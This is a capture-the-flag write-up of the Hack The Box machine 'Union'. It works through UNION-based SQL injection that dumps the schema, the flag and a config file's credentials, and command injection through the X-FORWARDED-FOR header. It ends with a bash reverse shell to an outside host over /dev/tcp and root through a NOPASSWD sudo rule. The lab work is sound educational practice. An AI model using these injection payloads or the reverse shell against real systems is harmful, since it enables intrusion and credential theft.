Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses.

Let's start with a full nmap scan:
```
sudo nmap -sC -sV -p- 10.10.11.128

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 01:08 EDT

```
Looks like all we have is port 80, lets visit the website. 

We see an input form called a player eligibility check, so we run BurpSuite. We enter below as a common SQL injection attack and open the request in BurpSuite, then send it to BurpSuite repeater:
```
' OR 1=1 --
```
We get the following:
```
POST /index.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0

player' OR 1=1 --
```
We see that the SQL commenting out command "--" is removing the line that is giving us the "Complete the challenge" link, meaning that the sql injection is working. 

We now try a different request to list out all of the SQL databases on the server:
```
player=' UNION SELECT group_concat(SCHEMA_NAME) from information_schema.schemata-- - 
```
and we get a list: mysql,information_schema,performance_schema,sys,november.

All the databases are the mySQL default databases except for november.

We try to enumerate the november database:
```
player=' UNION SELECT group_concat(COLUMN_name, TABLE_name) from information_schema.columns where TABLE_SCHEMA LIKE "november" -- -

Sorry, oneflag,playerplayers you are not eligible due to already qualifying.
```
We get the two tables "flag" and "player" with the respective columns "one" and "player."

We now get the flag value:
```
player=' UNION SELECT group_concat(one) from november.flag -- -

UHC{F1rst_5tep_2_Qualify}
```
This isn't a user/root flag for HTB, but a flag used for http://10.10.11.128/firewall.php 

Once we enter the flag, we see 
```
Welcome Back!
Your IP Address has now been granted SSH Access.
```

We didn't see that the host had ssh open from nmap, so we double check with nmap and see that it is open:
```
sudo nmap -p 22 10.10.11.128

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 04:14 EDT
Nmap scan report for 10.10.11.128
Host is up (0.027s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

Now that we supposedly have SSH access, we can try and look for credentials on the web server. We can use the following injection to list the index.php file using SQL:
```
' UNION SELECT LOAD_FILE('/var/www/html/index.php')-- -
```
and we see some interesting lines of code that backend process SQLMap attempts:
```
<?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {

	$player = strtolower($_POST['player']);

	// SQLMap Killer
	$badwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
	foreach ($badwords as $badword) {
		if (preg_match( $badword, $player )) {
			echo 'Congratulations ' . $player . ' you may compete in this tournament!';
			die();
		}
	}

	$sql = "SELECT player FROM players WHERE player = '" . $player . "';";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_array( $result, MYSQLI_ASSOC);
	if ($row) {
		echo 'Sorry, ' . $row['player'] . " you are not eligible due to already qualifying.";
	} else {
		echo 'Congratulations ' . $player . ' you may compete in this tournament!';
		echo '<br />';
		echo '<br />';
		echo 'Complete the challenge <a href="/challenge.php">here</a>';
	}
	exit;
  }
?>
```
We notice a config.php file which we can invoke:
```
' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -

?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```
Now we can SSH with the password pair uhc uhc-11qual-global-pw, and we get the HTB user flag:
```
sudo ssh uhc@10.10.11.128
uhc@union:~$
cat user.txt
245c20c4a0e0b9bfcb16ebedc54649e9
```
### User Flag Found
Now we can go to the website directory and see that we do have access to write to the configuration files:
```
uhc@union:/var/www/html$ ls -la
total 16
drwxr-xr-x 1 root root   94 Nov  8  2021 .
drwxr-xr-x 1 root root    8 Jul  2  2021 ..
-rw-r--r-- 1 htb  htb  1203 Nov  5  2021 challenge.php
-rw-r--r-- 1 htb  htb   207 Nov  4  2021 config.php
drwxr-xr-x 1 htb  htb    34 Nov  4  2021 css
-rw-r--r-- 1 htb  htb  1028 Nov  5  2021 firewall.php
-rw-r--r-- 1 htb  htb  2093 Nov  4  2021 index.php
```
We see in firewall.php that we can use the X-FORWARDED-FOR header to possibly get RCE:
```
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```
We can run a sleep command to confirm that we have RCE through BurpSuite:
```
X-FORWARDED-FOR: ;sleep 1;
X-FORWARDED-FOR: ;sleep 2;
X-FORWARDED-FOR: ;sleep 3;
```
We see on the bottom right of BurpSuite that upon running these commands, the HTTP responses will correspond to 1000,2000,3000 milliseconds, meaning that we have RCE. Now we can use a bash reverse shell:
```
sudo nc -lvnp 9001

;bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1';

Connection received on 10.10.11.128 60254
bash: cannot set terminal process group (808): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$ 
```
Now we do sudo -l to list privileges:
```
www-data@union:~/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```
And we see that we are effectively the root user. 

We do sudo su and go to root to get the root flag:
```
sudo su
dir
bin   cdrom  etc   lib	  lib64   media  opt   root  sbin  sys	usr
boot  dev    home  lib32  libx32  mnt	 proc  run   srv   tmp	var
cd /root
dir
root.txt  snap
cat root.txt
c57f3c32034468f4b5f215b21802695e
```
### Root Flag Found

This box had very little SQL injection filtering, so we were able to use UNION SELECT and group_concat() to get the names of the SQL table and columns. We were also able to get a flag value from the website that allowed us to SSH onto the machine, but in hindsight we didn't even need to SSH since we could just look at the firewall.php file through the LOAD_FILE injection and deduce that we can use the HTTP header X-FORWARDED-FOR to run a bash reverse shell to the www-data user which had root privileges. Please note that you need to do two linebreaks in BurpSuite repeater with the X-FORWARDED-FOR header or the request will not work.
